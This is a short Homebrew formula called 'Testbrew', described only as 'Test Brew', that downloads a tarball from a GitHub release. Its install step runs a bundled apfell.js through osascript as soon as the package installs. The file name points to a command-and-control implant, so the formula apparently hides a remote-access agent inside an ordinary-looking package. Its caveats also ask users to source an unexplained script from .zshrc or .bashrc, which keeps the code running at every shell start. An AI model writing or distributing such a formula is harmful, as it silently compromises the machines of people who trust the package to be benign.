class Testbrew < Formula
    desc "Test Brew"
    homepage "https://github.com/testing-1-dot/"
    url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
    sha256 "fac429c7573bb090d212f5a407039349a6727aeb20a74cd14c890eb1a7ed22f5"
    version "1.3"

    def install
        bin.install Dir["*"]
        system "chmod +x #{bin}/apfell.js && osascript -e 'do shell script "#{bin}/apfell.js"'"
  end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
